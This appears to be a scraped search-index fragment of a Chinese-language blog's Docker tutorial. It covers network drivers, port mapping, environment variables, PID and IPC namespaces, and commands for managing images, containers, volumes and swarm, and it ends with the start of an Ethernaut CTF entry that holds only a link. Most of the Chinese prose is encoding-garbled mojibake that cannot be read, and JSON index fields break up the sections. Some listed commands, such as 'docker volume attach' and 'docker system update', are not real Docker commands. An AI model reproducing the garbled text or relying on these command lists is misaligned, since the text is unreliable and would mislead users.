æ¡¥æ¥æ¨¡å¼ï¼Œ é»˜è®¤æ¨¡å¼ # ç›¸å½“äºVmwareä¸­çš„Natæ¨¡å¼ï¼Œå®¹å™¨ä½¿ç”¨ç‹¬ç«‹network Namespaceï¼Œå¹¶è¿æ¥åˆ°docker0è™šæ‹Ÿç½‘å¡ï¼ˆé»˜è®¤æ¨¡å¼ï¼‰ã€‚ # é€šè¿‡docker0ç½‘æ¡¥ä»¥åŠIptables natè¡¨é…ç½®ä¸å®¿ä¸»æœºé€šä¿¡ï¼› # bridgeæ¨¡å¼æ˜¯Dockeré»˜è®¤çš„ç½‘ç»œè®¾ç½®ï¼Œæ­¤æ¨¡å¼ä¼šä¸ºæ¯ä¸€ä¸ªå®¹å™¨åˆ†é…Network Namespaceã€è®¾ç½®ä¸€ä¸ªå†…éƒ¨IPç­‰ï¼Œ # å¹¶å°†ä¸€ä¸ªä¸»æœºä¸Šçš„Dockerå®¹å™¨è¿æ¥åˆ°ä¸€ä¸ªè™šæ‹Ÿç½‘æ¡¥ä¸Š # run 2 busybox with bridge dirver in background docker run -d --name busybox1 --network=bridge busybox:latest sleep 1000 # --network=bridge é»˜è®¤driverï¼Œ å¯ä»¥ä¸å†™ docker run -d --name busybox2 busybox:latest sleep 1000 # get ip of busybox1 ip1=`docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' busybox1` echo \"run busybox1 with \u003cbridge\u003e network driver, got ip :\" ${ip1} \"it should be an internal ip\" # get ip of busybox2 ip2=`docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' busybox2` echo \"run busybox2 with \u003cbridge\u003e network driver, got ip :\" ${ip2} \"it should be an internal ip\" echo \"\\033[32mbusybox1 ping busybox2 \\033[0m\" docker exec busybox1 ping -c 5 ${ip2} #clean docker kill busybox1 busybox2 exitedContains=`docker ps -a -q --filter status=exited --format=\"{{.ID}}\"` docker rm ${exitedContains} ç½‘ç»œé©±åŠ¨2: Host å®¹å™¨å°†ç›´æ¥ä½¿ç”¨ä¸»æœºçš„ç½‘ç»œæ ˆè¿›è¡Œç½‘ç»œé€šä¿¡ã€‚è¿™æ„å‘³ç€å®¹å™¨å¯ä»¥ç›´æ¥è®¿é—®ä¸»æœºä¸Šçš„ç½‘ç»œæ¥å£ï¼Œå¹¶ä¸ä¸»æœºä¸Šçš„å…¶ä»–å®¹å™¨å…±äº«ç›¸åŒçš„IPåœ°å€å’Œç«¯å£ã€‚å› æ­¤ï¼Œå¦‚æœä½¿ç”¨hostæ¨¡å¼ï¼Œå®¹å™¨çš„ç½‘ç»œé…ç½®å°†ä¸ä¸»æœºçš„ç½‘ç»œé…ç½®å®Œå…¨ç›¸åŒ hostç½‘ç»œé©±åŠ¨åªé€‚ç”¨äºLinuxä¸»æœºï¼Œä¸æ”¯æŒDocker Desktop for Macã€Docker Desktop for Windowsæˆ–Docker EE for Windows Server #!/usr/bin/env sh # hostæ¨¡å¼ # ç›¸å½“äºVmwareä¸­çš„æ¡¥æ¥æ¨¡å¼ï¼Œä¸å®¿ä¸»æœºåœ¨åŒä¸€ä¸ªç½‘ç»œä¸­ï¼Œä½†æ²¡æœ‰ç‹¬ç«‹IPåœ°å€ã€‚ # Dockerä½¿ç”¨äº†Linuxçš„NamespacesæŠ€æœ¯æ¥è¿›è¡Œèµ„æºéš”ç¦»ï¼Œå¦‚PID Namespaceéš”ç¦»è¿›ç¨‹ï¼ŒMount Namespaceéš”ç¦»æ–‡ä»¶ç³»ç»Ÿï¼ŒNetwork Namespaceéš”ç¦»ç½‘ç»œç­‰ã€‚ # ä¸€ä¸ªNetwork Namespaceæä¾›äº†ä¸€ä»½ç‹¬ç«‹çš„ç½‘ç»œç¯å¢ƒï¼ŒåŒ…æ‹¬ç½‘å¡ã€è·¯ç”±ã€Iptableè§„åˆ™ç­‰éƒ½ä¸å…¶ä»–çš„Network Namespaceéš”ç¦»ã€‚ # ä¸€ä¸ªDockerå®¹å™¨ä¸€èˆ¬ä¼šåˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„Network Namespaceã€‚ # ä½†å¦‚æœå¯åŠ¨å®¹å™¨çš„æ—¶å€™ä½¿ç”¨hostæ¨¡å¼ï¼Œé‚£ä¹ˆè¿™ä¸ªå®¹å™¨å°†ä¸ä¼šè·å¾—ä¸€ä¸ªç‹¬ç«‹çš„Network Namespaceï¼Œè€Œæ˜¯å’Œå®¿ä¸»æœºå…±ç”¨ä¸€ä¸ªNetwork Namespaceã€‚ # å®¹å™¨å°†ä¸ä¼šè™šæ‹Ÿå‡ºè‡ªå·±çš„ç½‘å¡ï¼Œé…ç½®è‡ªå·±çš„IPç­‰ï¼Œè€Œæ˜¯ä½¿ç”¨å®¿ä¸»æœºçš„IPå’Œç«¯å£ã€‚ #hostç½‘ç»œé©±åŠ¨åªé€‚ç”¨äºLinuxä¸»æœºï¼Œä¸æ”¯æŒDocker Desktop for Macã€Docker Desktop for Windowsæˆ–Docker EE for Windows Server docker run -d --name=ubuntu1 --network=host ubuntu sleep 1000 # get ip of busybox1 ip1=`docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ubuntu1` echo \"run ubuntu1 with \u003chost\u003e network driver, got ip :\" ${ip1} \"it should be an empty string\" ip2=`docker exec ubuntu1 hostname -I` echo \"run ubuntu1 with \u003chost\u003e network driver, got ip :\" ${ip2} \"it should be same as your computer\" docker run -d --name=ubuntu2 --network=host ubuntu sleep 1000 ip2=`docker exec ubuntu1 hostname -I` echo \"run ubuntu2 with \u003chost\u003e network driver, got ip :\" ${ip2} \"it should be same as your computer\" docker run -d --name=busybox1 --network=host busybox sleep 1000 ip2=`docker exec ubuntu1 hostname -I` echo \"run busybox1 with \u003chost\u003e network driver, got ip :\" ${ip2} \"it should be same as your computer\" #clean docker kill ubuntu1 ubuntu2 busybox1 exitedContains=`docker ps -a -q --filter status=exited --format=\"{{.ID}}\"` docker rm ${exitedContains} å…¶å®ƒæ–¹å¼ è®¿é—®å®¿ä¸»æœºç½‘ç»œ, é™¤äº†--network=hostå¤–,è¿˜å¯ä»¥: --add-host : æ›´æ–°å®¹å™¨ä¸­çš„/etc/hostsä¸ºç›¸å…³å˜é‡ä¸ºå®¿ä¸»æœºå™¨çš„ docker run -d --add-host host.docker.internal:host-gateway my-container:latest #æˆ– --add-host localhost:10.0.2.2 ç½‘ç»œé©±åŠ¨3: Container å…±äº«å…¶å®ƒcontainerçš„ #!/usr/bin/env sh # å®¹å™¨æ¨¡å¼ #è¿™ä¸ªæ¨¡å¼æŒ‡å®šæ–°åˆ›å»ºçš„å®¹å™¨å’Œå·²ç»å­˜åœ¨çš„ä¸€ä¸ªå®¹å™¨å…±äº«ä¸€ä¸ªNetwork Namespaceï¼Œè€Œä¸æ˜¯å’Œå®¿ä¸»æœºå…±äº«ã€‚ #æ–°åˆ›å»ºçš„å®¹å™¨ä¸ä¼šåˆ›å»ºè‡ªå·±çš„ç½‘å¡ï¼Œé…ç½®è‡ªå·±çš„IPï¼Œè€Œæ˜¯å’Œä¸€ä¸ªæŒ‡å®šçš„å®¹å™¨å…±äº«IPã€ç«¯å£èŒƒå›´ç­‰ã€‚ # åŒæ ·ï¼Œä¸¤ä¸ªå®¹å™¨é™¤äº†ç½‘ç»œæ–¹é¢ï¼Œå…¶ä»–çš„å¦‚æ–‡ä»¶ç³»ç»Ÿã€è¿›ç¨‹åˆ—è¡¨ç­‰è¿˜æ˜¯éš”ç¦»çš„ã€‚ # ä¸¤ä¸ªå®¹å™¨çš„è¿›ç¨‹å¯ä»¥é€šè¿‡loç½‘å¡è®¾å¤‡é€šä¿¡ã€‚ docker run --name container1 -d --network=bridge ubuntu:latest sleep 1000 docker run --name container2 -d --network=container:container1 ubuntu:latest sleep 1000 ip1=`docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container1` echo \"run container1 with \u003cbridge\u003e network driver, got ip :\" ${ip1} \"it should be an internal ip\" ip2=`docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container2` echo \"run container2 with \u003ccontainer\u003e network driver, got ip :\" ${ip2} \"it","date":"2023-02-23","objectID":"/about_docker/:5:2","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"ç«¯å£æ˜ å°„ -p å®¿ä¸»æœºç«¯å£1:å®¹å™¨ç«¯å£1 -p å®¿ä¸»æœºç«¯å£2:å®¹å™¨ç«¯å£2 # æ¯”å¦‚è¿è¡Œä¸€ä¸ªhttp server docker run -dit --rm --name my-apache-app -p 8080:80 -v \"$PWD\":/usr/local/apache2/htdocs/ httpd ","date":"2023-02-23","objectID":"/about_docker/:5:3","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"ç¯å¢ƒå˜é‡ è®¾ç½®å®¹å™¨çš„ç¯å¢ƒå˜é‡ -e X=Y å®¹å™¨ä¸­çš„ç¨‹åºä»£ç å¯ä»¥é€šè¿‡è¯»å–ç¯å¢ƒå˜é‡çš„æ–¹å¼æ¥å¤„ç†åŠ¨æ€å€¼, è€Œä¸æ˜¯ç¡¬ç¼–ç  æ¯”å¦‚å®¹å™¨ä¸­è¿æ¥æ•°æ®åº“æ—¶æ— æ³•ç¡®å®šçš„æ•°æ®: func getDbUrlFromEnv() string { // get from env var password = os.Getenv(\"MYSQL_PASSWORD\") var host = os.Getenv(\"MYSQL_HOST\") var port = os.Getenv(\"MYSQL_PORT\") var user = os.Getenv(\"MYSQL_USER\") var dburl = user + \":\" + password + \"@tcp(\" + host + \":\" + port + \")/\" //log.Println(\"dburl:\", dburl) return dburl } docker run --name xxapp -e MYSQL_USER=root -e MYSQL_PASSWORD=123456 -e MYSQL_HOST=mysqldb -e MYSQL_PORT=3306 --rm -p 9192:9192 xxx:latest ","date":"2023-02-23","objectID":"/about_docker/:5:4","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"PIDè®¾ç½® PID å‘½åç©ºé—´æ˜¯ Docker ä¸­çš„éš”ç¦»æŠ€æœ¯ä¹‹ä¸€ï¼Œå®ƒå¯ä»¥å°†å®¹å™¨ä¸­çš„è¿›ç¨‹éš”ç¦»åœ¨ä¸€ä¸ªç‹¬ç«‹çš„å‘½åç©ºé—´ä¸­ï¼Œä»è€Œä¿è¯å®¹å™¨å†…çš„è¿›ç¨‹ä¸èƒ½è®¿é—®ä¸»æœºä¸Šçš„ä»»ä½•è¿›ç¨‹ã€‚ è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼š é¿å…å®¹å™¨å†…çš„è¿›ç¨‹å¯¹ä¸»æœºè¿›ç¨‹é€ æˆä»»ä½•å½±å“ã€‚ å¯ä»¥è®©å®¹å™¨å†…çš„è¿›ç¨‹ä»¥ä¸ºè‡ªå·±æ˜¯æ•´ä¸ªç³»ç»Ÿçš„å”¯ä¸€è¿›ç¨‹ã€‚ æé«˜å®¹å™¨éš”ç¦»æ€§ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker å®¹å™¨å†…çš„è¿›ç¨‹éƒ½æ˜¯è¿è¡Œåœ¨ç‹¬ç«‹çš„ PID å‘½åç©ºé—´ä¸­çš„ã€‚å¯ä»¥ä½¿ç”¨ --pid=host é€‰é¡¹æ¥è®©å®¹å™¨å†…çš„è¿›ç¨‹ä¸ä¸»æœºä¸Šçš„è¿›ç¨‹å…±äº«åŒä¸€ä¸ª PID å‘½åç©ºé—´ã€‚ FROM alpine:latest # htop, a cross-platform interactive process viewer. RUN apk add --update htop \u0026\u0026 rm -rf /var/cache/apk/* CMD [\"htop\"] # FROM ubuntu:latest # RUN apt-get update \u0026\u0026 apt-get install -y htop \u0026\u0026 rm -rf /var/lib/apt/lists/* # CMD [\"htop\"] ä»¥éš”ç¦»çš„è¿›ç¨‹ç©ºé—´è¿è¡Œ docker run -it --rm myhtop ä½¿ç”¨å®¿ä¸»æœºçš„è¿›ç¨‹ç©ºé—´è¿è¡Œ docker run -it --rm --pid=host myhtop ","date":"2023-02-23","objectID":"/about_docker/:5:5","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"IPCè®¾ç½® IPCï¼ˆInter-Process Communicationï¼‰å‘½åç©ºé—´æ˜¯Dockerä¸­çš„ä¸€ç§éš”ç¦»æŠ€æœ¯ï¼Œç”¨äºéš”ç¦»è¿›ç¨‹é—´çš„IPCé€šä¿¡ã€‚åœ¨æ¯ä¸ªå®¹å™¨ä¸­ï¼ŒIPCå‘½åç©ºé—´ä¼šä¸ºæ¯ä¸ªå®¹å™¨åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„IPCé€šä¿¡ç¯å¢ƒï¼Œä½¿å¾—å„ä¸ªå®¹å™¨é—´çš„è¿›ç¨‹é—´é€šä¿¡ä¸äº’ç›¸å¹²æ‰°ã€‚è¿™æ ·ï¼Œå³ä½¿å®¹å™¨ä¸­çš„è¿›ç¨‹ä¸ä¿¡ä»»ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨IPCé€šä¿¡ç­‰æŠ€æœ¯ï¼Œè€Œä¸ç”¨æ‹…å¿ƒå®¹å™¨é—´é€šä¿¡çš„å®‰å…¨é—®é¢˜ã€‚å¯ä»¥é€šè¿‡ --ipc=\"MODE\" æ¥è®¾ç½® Value Description â€â€ Use daemonâ€™s default. If not specified, daemon default is used, which can either be \"private\" or \"shareable\", depending on the daemon version and configuration. â€œnoneâ€ Own private IPC namespace, with /dev/shm not mounted. â€œprivateâ€ Own private IPC namespace. â€œshareableâ€ Own private IPC namespace, with a possibility to share it with other containers. â€œcontainer: \u003cname-or-ID\u003e\" Join another (â€œshareableâ€) containerâ€™s IPC namespace. â€œhostâ€ Use the host systemâ€™s IPC namespace. å‚è€ƒ ipc_demo ","date":"2023-02-23","objectID":"/about_docker/:5:6","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"docker compose Docker Composeæ˜¯ä¸€ä¸ªç”¨äºå®šä¹‰å’Œè¿è¡Œå¤šå®¹å™¨Dockeråº”ç”¨ç¨‹åºçš„å·¥å…·ã€‚å®ƒä½¿ç”¨ä¸€ä¸ªYAMLæ–‡ä»¶æ¥é…ç½®åº”ç”¨ç¨‹åºæœåŠ¡ã€ç½‘ç»œå’Œæ•°æ®å·ï¼Œå¹¶å°†æ‰€æœ‰æœåŠ¡ä¸€èµ·å¯åŠ¨å’Œç®¡ç†ã€‚ å‚è€ƒDEMO: gotodo https://docs.docker.com/compose/ /Users/zhouyinhui/Desktop/docker_training/dockercomposeå¤‡å¿˜æ¸…å•.pdf ","date":"2023-02-23","objectID":"/about_docker/:6:0","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"ç®¡ç† ","date":"2023-02-23","objectID":"/about_docker/:7:0","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"é•œåƒç®¡ç† Dockeré•œåƒç®¡ç†åœºæ™¯ä¸‹å¸¸ç”¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š æœç´¢é•œåƒï¼šdocker search \u003cimage_name\u003e ä¸‹è½½é•œåƒï¼šdocker pull \u003cimage_name\u003e æŸ¥çœ‹æœ¬åœ°é•œåƒï¼šdocker images åˆ é™¤é•œåƒï¼šdocker rmi \u003cimage_id/image_name\u003e æ ‡è®°é•œåƒï¼šdocker tag \u003cimage_id/image_name\u003e \u003cnew_image_name\u003e å¯¼å‡ºé•œåƒï¼šdocker save \u003cimage_name\u003e \u003e \u003cfile_name.tar\u003e å¯¼å…¥é•œåƒï¼šdocker load \u003c \u003cfile_name.tar\u003e æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ docker inspect \u003cimage_name\u003e è‡ªå®šä¹‰ä»“åº“ ç•¥ å…³äºå¯¼å…¥å¯¼å‡ºé•œåƒ image -\u003e tar -\u003e image å¯¼å‡º: docker save: https://docs.docker.com/engine/reference/commandline/save/ docker save myimage:latest | gzip \u003e myimage_latest.tar.gz # æˆ– docker save -o myimage_latest.tar myimage:latest å¯¼å…¥: docker load: https://docs.docker.com/engine/reference/commandline/load/ docker load \u003c myimage_latest.tar.gz å…³äºé•œåƒå‡çº§ åœ¨çº¿: ç›´æ¥docker pull myimage:version ç¦»çº¿: åˆ©ç”¨å¯¼å…¥å¯¼å‡º åŸºæœ¬æ­¥éª¤ docker stop mycontainer docker rmi myimage docker pull myimage:version æˆ–è€… docker load xxx docker run xxx æ³¨æ„æ•°æ®å· ","date":"2023-02-23","objectID":"/about_docker/:7:1","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"å®¹å™¨ç®¡ç† ä¸€äº›å¸¸è§çš„ Docker å®¹å™¨ç®¡ç†å‘½ä»¤åŒ…æ‹¬ï¼š docker ps: æ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker start: å¯åŠ¨ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å®¹å™¨ docker stop: åœæ­¢ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker restart: é‡å¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker kill: ç»ˆæ­¢ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker rm: åˆ é™¤ä¸€ä¸ªå®¹å™¨ docker logs: æ˜¾ç¤ºå®¹å™¨çš„æ—¥å¿—ä¿¡æ¯ docker top: æ˜¾ç¤ºå®¹å™¨å†…æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ docker attach: è¿æ¥åˆ°å®¹å™¨çš„æ§åˆ¶å°ã€‚ docker inspect : æŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯ å®¹å™¨å¯¼å‡ºä¸ºé•œåƒ docker export export å¯¼å‡ºçš„æ˜¯å®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿ æ¯”å¦‚åŸé•œåƒä¸­çš„dockerfile ä¸­çš„CMD xxx æ˜¯æ²¡æœ‰è¢«å¤åˆ¶è¿‡æ¥çš„,åªä¿ç•™æ–‡ä»¶ å¦å¤–, ä¹Ÿä¸ä¼šæ‹·è´æ•°æ®å·ä¸­çš„å†…å®¹ docker export: https://docs.docker.com/engine/reference/commandline/export/ The docker export command does not export the contents of volumes associated with the container. å¯¼å…¥: docker import: https://docs.docker.com/engine/reference/commandline/import/ æ³¨æ„: importåªæ˜¯æŠŠæ–‡ä»¶ç³»ç»Ÿæ‹·è´è¿‡æ¥äº†, ä¹Ÿå°±æ˜¯è¯´åªåŒ…å«æ–‡ä»¶, ä¸åŒ…å«å‘½ä»¤ æ‰€æœ‰, æ‹·è´è¿‡æ¥åæ˜¯æ²¡æœ‰cmdè¿è¡Œçš„, ä½†æ–‡ä»¶éƒ½åœ¨ æ‰€ä»¥å¯ä»¥æ‰‹åŠ¨è¿è¡Œ: docker commit docker commit å‘½ä»¤ç”¨äºä¿å­˜å®¹å™¨çš„å½“å‰çŠ¶æ€ä¸ºä¸€ä¸ªæ–°çš„é•œåƒã€‚å½“ä½ åœ¨å®¹å™¨ä¸­å®‰è£…è½¯ä»¶ï¼Œåˆ›å»ºæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼Œæˆ–è¿›è¡Œå…¶ä»–ä¿®æ”¹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ­¤å‘½ä»¤æäº¤å®¹å™¨çš„å½“å‰çŠ¶æ€ã€‚ç„¶åå¯ä»¥ä½¿ç”¨æ–°é•œåƒåˆ›å»ºæ–°å®¹å™¨ï¼Œå¹¶ä»å®¹å™¨çš„å…ˆå‰çŠ¶æ€æ¢å¤ã€‚ å‚è€ƒä¸Šé¢çš„: åˆ›å»ºè‡ªå·±çš„é•œåƒ-æ–¹å¼1 éšç³»ç»Ÿå¯åŠ¨ä¸è‡ªåŠ¨è¿è¡Œ éšç³»ç»Ÿå¯åŠ¨dockeræœåŠ¡ systemctl enable docker.service éšdockeræœåŠ¡å¯åŠ¨container docker run -d --restart always myapp æˆ– Dockercomposeä¸­ myapp: restart: always è¿˜å¯ä»¥åœ¨appå¼‚å¸¸é€€å‡ºæ—¶è‡ªåŠ¨é‡å¯app: --restart on-failure:3 https://docs.docker.com/config/containers/start-containers-automatically/ Flag Description no Do not automatically restart the container. (the default) on-failure[:max-retries] Restart the container if it exits due to an error, which manifests as a non-zero exit code. Optionally, limit the number of times the Docker daemon attempts to restart the container using the :max-retries option. always Always restart the container if it stops. If it is manually stopped, it is restarted only when Docker daemon restarts or the container itself is manually restarted. (See the second bullet listed in restart policy details) unless-stopped Similar to always, except that when the container is stopped (manually or otherwise), it is not restarted even after Docker daemon restarts. ä½¿ç”¨é‡å¯ç­–ç•¥æ—¶è¯·è®°ä½ä»¥ä¸‹å‡ ç‚¹ï¼š é‡å¯ç­–ç•¥åªæœ‰åœ¨å®¹å™¨å¯åŠ¨æˆåŠŸåæ‰ä¼šç”Ÿæ•ˆã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯åŠ¨æˆåŠŸæ„å‘³ç€å®¹å™¨å·²ç»å¯åŠ¨è‡³å°‘ 10 ç§’ï¼Œå¹¶ä¸” Docker å·²ç»å¼€å§‹å¯¹å…¶è¿›è¡Œç›‘æ§ã€‚è¿™å¯ä»¥é˜²æ­¢æ ¹æœ¬æ²¡æœ‰å¯åŠ¨çš„å®¹å™¨è¿›å…¥é‡å¯å¾ªç¯ã€‚ å¦‚æœæ‚¨æ‰‹åŠ¨åœæ­¢å®¹å™¨ï¼Œåˆ™å…¶é‡å¯ç­–ç•¥å°†è¢«å¿½ç•¥ï¼Œç›´åˆ° Docker å®ˆæŠ¤ç¨‹åºé‡æ–°å¯åŠ¨æˆ–å®¹å™¨è¢«æ‰‹åŠ¨é‡æ–°å¯åŠ¨ã€‚è¿™æ˜¯é˜²æ­¢é‡å¯å¾ªç¯çš„å¦ä¸€ç§å°è¯•ã€‚ é‡å¯ç­–ç•¥ä»…é€‚ç”¨äºå®¹å™¨ã€‚é›†ç¾¤æœåŠ¡çš„é‡å¯ç­–ç•¥é…ç½®ä¸åŒã€‚ ","date":"2023-02-23","objectID":"/about_docker/:7:2","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"ç½‘ç»œç®¡ç† Docker ç½‘ç»œç®¡ç†çš„å¸¸è§å‘½ä»¤åŒ…æ‹¬ï¼š docker network create: ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„ Docker ç½‘ç»œ docker network inspect: ç”¨äºæ£€æŸ¥ç½‘ç»œçš„è¯¦ç»†ä¿¡æ¯ docker network ls: ç”¨äºåˆ—å‡ºæ‰€æœ‰çš„ Docker ç½‘ç»œ docker network connect: ç”¨äºè¿æ¥ä¸€ä¸ªå®¹å™¨åˆ°ç°æœ‰çš„ Docker ç½‘ç»œ docker network disconnect: ç”¨äºæ–­å¼€å®¹å™¨ä¸ç½‘ç»œçš„è¿æ¥ docker network rm: ç”¨äºåˆ é™¤ä¸€ä¸ª Docker ç½‘ç»œ docker network prune: ç”¨äºåˆ é™¤æ‰€æœ‰æ²¡æœ‰ä½¿ç”¨çš„ Docker ç½‘ç»œ ","date":"2023-02-23","objectID":"/about_docker/:7:3","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"æ•°æ®å·ç®¡ç† å¸¸è§çš„ Docker æ•°æ®å·ç®¡ç†å‘½ä»¤å¦‚ä¸‹ï¼š docker volume createï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®å·ã€‚ docker volume lsï¼šåˆ—å‡ºæ‰€æœ‰çš„æ•°æ®å·ã€‚ docker volume inspectï¼šæŸ¥çœ‹æ•°æ®å·çš„è¯¦ç»†ä¿¡æ¯ã€‚ docker volume rmï¼šåˆ é™¤ä¸€ä¸ªæ•°æ®å·ã€‚ docker volume pruneï¼šåˆ é™¤æ‰€æœ‰æœªä½¿ç”¨çš„æ•°æ®å·ã€‚ docker volume attachï¼šæŒ‚è½½ä¸€ä¸ªæ•°æ®å·åˆ°ä¸€ä¸ªå®¹å™¨ä¸Šã€‚ docker volume detachï¼šä»ä¸€ä¸ªå®¹å™¨ä¸­åˆ†ç¦»å‡ºä¸€ä¸ªæ•°æ®å·ã€‚ docker run -vï¼šåœ¨å¯åŠ¨å®¹å™¨æ—¶ï¼Œä½¿ç”¨ -v å‚æ•°å°†æ•°æ®å·æŒ‚è½½åˆ°å®¹å™¨ä¸Šã€‚ ","date":"2023-02-23","objectID":"/about_docker/:7:4","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"æ—¥å¿— æœ€åŸºæœ¬çš„, é€šè¿‡ docker logs \u003ccontainer\u003e æŸ¥çœ‹å®¹å™¨ä¸­åº”ç”¨ç¨‹åºçš„æ§åˆ¶å°è¾“å‡º ~/Desktop/docker_training/demo/ipc_demo â¯ docker logs ipc_demo_pub Bound to pubsub.ipc sent: now: 2023-02-09 06:17:57.645847 sent: now: 2023-02-09 06:17:58.646370 sent: now: 2023-02-09 06:17:59.646992 sent: now: 2023-02-09 06:18:00.647609 æ›´å¤šçš„ : https://docs.docker.com/engine/reference/commandline/logs/ ","date":"2023-02-23","objectID":"/about_docker/:7:5","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"docker inspect æŸ¥çœ‹å„ç§åº•å±‚ä¿¡æ¯ ä¾‹å¦‚ æŸ¥çœ‹å®¹å™¨ ipc_demo_pubçš„ipåœ°å€ docker container inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ipc_demo_pub 172.17.0.2 -f (format) åé¢çš„å­—ç¬¦ä¸²è¯­æ³•å«åš go template å‚è€ƒè¿™é‡Œ https://pkg.go.dev/text/template https://www.escapelife.site/posts/8bf741fb.html å‚è€ƒ: https://docs.docker.com/engine/reference/commandline/inspect/ https://linuxhandbook.com/docker-inspect-command/ ","date":"2023-02-23","objectID":"/about_docker/:7:6","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"ç³»ç»Ÿç®¡ç† docker system pruneï¼šæ¸…ç† Docker ç³»ç»Ÿä¸­ä¸å†ä½¿ç”¨çš„æ•°æ® docker system dfï¼šæŸ¥çœ‹ Docker ç³»ç»Ÿçš„ç£ç›˜ä½¿ç”¨æƒ…å†µ docker system info / docker infoï¼šæŸ¥çœ‹ Docker ç³»ç»Ÿé…ç½®ä¿¡æ¯ docker system eventsï¼šæŸ¥çœ‹ Docker ç³»ç»Ÿä¸­çš„å®æ—¶äº‹ä»¶ docker system updateï¼šæ›´æ–° Docker ç³»ç»Ÿ docker system versionï¼šæŸ¥çœ‹ Docker ç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯ ","date":"2023-02-23","objectID":"/about_docker/:7:7","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"docker swarm Docker Swarm æ˜¯ Docker å®˜æ–¹æä¾›çš„å®¹å™¨é›†ç¾¤ç®¡ç†è§£å†³æ–¹æ¡ˆã€‚å®ƒå…è®¸ç”¨æˆ·ç®¡ç†å’Œéƒ¨ç½²å¤šä¸ª Docker å®¹å™¨åˆ°å¤šå°æœåŠ¡å™¨ä¸Šã€‚Swarm æŠŠå¤šä¸ª Docker ä¸»æœºå½“ä½œä¸€ä¸ªé€»è¾‘ä¸»æœºï¼Œç”¨æˆ·å¯ä»¥åœ¨è¿™ä¸ªé€»è¾‘ä¸»æœºä¸Šç®¡ç†å¤šä¸ªå®¹å™¨ã€‚Swarm æä¾›äº†è´Ÿè½½å‡è¡¡ã€æ•…éšœè½¬ç§»ã€æœåŠ¡å‘ç°ã€é…ç½®ç®¡ç†ç­‰åŠŸèƒ½ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥æ›´åŠ æ–¹ä¾¿åœ°ç®¡ç†å®¹å™¨é›†ç¾¤ docker swarm initï¼šåœ¨å½“å‰èŠ‚ç‚¹ä¸Šåˆå§‹åŒ–Swarmé›†ç¾¤ã€‚ docker swarm joinï¼šåœ¨å½“å‰èŠ‚ç‚¹ä¸ŠåŠ å…¥Swarmé›†ç¾¤ã€‚ docker swarm leaveï¼šä»Swarmé›†ç¾¤ä¸­åˆ é™¤å½“å‰èŠ‚ç‚¹ã€‚ docker service createï¼šåœ¨Swarmé›†ç¾¤ä¸­åˆ›å»ºä¸€ä¸ªæ–°æœåŠ¡ã€‚ docker service inspectï¼šæ£€æŸ¥Swarmé›†ç¾¤ä¸­çš„æœåŠ¡è¯¦ç»†ä¿¡æ¯ã€‚ docker service updateï¼šæ›´æ–°Swarmé›†ç¾¤ä¸­çš„æœåŠ¡ã€‚ docker service lsï¼šåˆ—å‡ºSwarmé›†ç¾¤ä¸­çš„æ‰€æœ‰æœåŠ¡ã€‚ docker node lsï¼šåˆ—å‡ºSwarmé›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚ ","date":"2023-02-23","objectID":"/about_docker/:7:8","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["web3"],"content":"ethernaut æŒ‘æˆ˜ ç¬¬19é¢˜, æ¯”è¾ƒæœ‰æ„æ€, è®°å½•ä¸€ä¸‹ è¿™ä¸ªç³»åˆ—çš„æŒ‘æˆ˜çš„å‚è€ƒç­”æ¡ˆ: https://github.com/yinhui1984/EthernautGameReferenceAnswers ","date":"2023-01-19","objectID":"/ethernaut_19_magicnumber/:0:0","tags":["solidity"],"title":"Ethernaut 19 